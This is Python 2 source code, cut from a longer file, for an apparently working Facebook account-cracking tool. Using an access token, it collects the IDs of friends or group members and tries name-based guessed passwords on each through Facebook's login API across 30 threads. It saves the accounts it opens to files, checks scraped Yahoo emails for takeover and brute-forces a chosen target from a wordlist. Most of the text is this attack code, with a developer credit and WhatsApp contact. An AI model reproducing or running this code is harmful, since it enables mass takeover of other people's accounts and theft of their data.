				                                                                                                   print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
	print "  \033[1;94mΒ«---β’ββ’---Developed By γπ΄π·ππ°ππ·π°πΌγ--β’ββ’---Β»" #Dev:γπ΄π·ππ°ππ·π°πΌγ
	print '\033[1;94mβProcess Has Been Completed Pressβ‘ Ctrl+Z.β© Next Type (0 & Data Reset)β©\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
	print """
             

ββββββββββββββββββββββββββββββββββ
ββββββββββββββββββββββββββββββββββ
ββββββββββββββββββββββββββββββββββ
ββββββββββββββββββββββββββββββββββ 
 
         Checkpoint ID Open After 7 Days

β’\033[1;97mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.
: \033[1;94m .....γπ΄π·ππ°ππ·π°πΌγ....... \033[1;97m :
β’\033[1;97mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.' 
                WhatsApp π
              \033[1;94m +923434810071"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	menu()
          
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m1.\x1b[1;93mClone Friend List Public ID."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m2.\x1b[1;93mBlack Jerry WhatsApp Group India."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m3.\x1b[1;93mBlack Jerry Youtube Chenal."
	print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;95mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[β’ββ’] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			super()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
        elif peak =="2":
	        os.system('xdg-open https://chat.whatsapp.com/FEsNY3oMSgDxo5pN')
	        menu()
        elif peak =="3":
	        os.system('xdg-open https://www.youtube.com/channel/UCuUzgS7lnF7S6xnWNl9aIgg')
	        menu()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97mΒ«--β’ββ’β’ββ’---\x1b[1;94mβ’ββ’Stop Process Press CTRL+Zβ’ββ’\033[1;97m---β’ββ’β’ββ’-Β»"
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	jalan(' \033[1;97m.................\033[1;94mCloning Start..\033[1;97m............ ')
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:γπ΄π·ππ°ππ·π°πΌγ
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['last_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = (b['first_name']+b['last_name'])								
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'								
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = (b['first_name']+'khan')											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = (b['first_name']+'sharma')						
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'						
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = (b['first_name']+'thakur')										
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = (b['first_name']+'gupta')					
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = (b['first_name']+'singh')											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = (b['first_name']+'kumar')					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
	print "  \033[1;94mΒ«---β’ββ’---Developed By γπ΄π·ππ°ππ·π°πΌγ--β’ββ’---Β»" #Dev:γπ΄π·ππ°ππ·π°πΌγ
	print '\033[1;94mβProcess Has Been Completed Pressβ‘ Ctrl+Z.β© Next Type (0 & Data Reset)β©\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
	print """
             
ββββββββββββββββββββββ
ββββββββββββββββββββββ
ββββββββββββββββββββββ
ββββββββββββββββββββββ
ββββββββββββββββββββββ
ββββββββββββββββββββββ
,Β‘|iΒΉi|Β‘, γγγγγ,Β‘|iΒΉi|Β‘, γ γγ ,Β‘|iΒΉi|Β‘,γ
ΒΉi|Β‘,Β‘|iΒΉγγγγγΒΉi|Β‘,Β‘|iΒΉγγγγΒΉi|Β‘,Β‘|iΒΉ γ

γγγ,Β‘|iΒΉi|Β‘, γγ γγ,Β‘|iΒΉi|Β‘,γ
γγγΒΉi|Β‘,Β‘|iΒΉγγγ γΒΉi|Β‘,Β‘|iΒΉγγγ
γγγγγ ,Β‘|iΒΉi|Β‘, γγγ
γγγγγ ΒΉi|Β‘,Β‘|iΒΉγγγ
,Β‘|iΒΉi|Β‘, γγγγ,Β‘|iΒΉi|Β‘, γ γ ,Β‘|iΒΉi|Β‘,γ
ΒΉi|Β‘,Β‘|iΒΉ γγγγΒΉi|Β‘,Β‘|iΒΉγ γΒΉi|Β‘,Β‘|iΒΉ
 
         Checkpoint ID Open After 7 Days

β’\033[1;97mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.
: \033[1;94m .....γπ΄π·ππ°ππ·π°πΌγ....... \033[1;97m :
β’\033[1;97mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.' 
                WhatsApp π
              \033[1;94m +923434810071"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	menu()

def clone_dari_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	id=raw_input('\033[1;96m[+] \033[1;93mClone  ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96m[\033[1;97mβ\033[1;96m] \033[1;93mName group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup not found"
		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
		menu()
	jalan('\033[1;96m[βΊ] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[βΊ] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[β] \033[1;92mVULN")
					print("\033[1;96m[βΉ] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[βΉ] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[βΉ] \033[1;97mName \033[1;91m: \033[1;92m"+nama)
					save = open('out/GrupMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97mβ\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile γπ΄π·ππ°ππ·π°πΌγ\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;93m ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.'
        try:
            email = raw_input('\x1b[1;91m[β] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
            passw = raw_input('\x1b[1;91m[β] \x1b[1;92mWordlist \x1b[1;97m(Apni lgaoπ) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;95m ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.'
            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' β ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;93m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
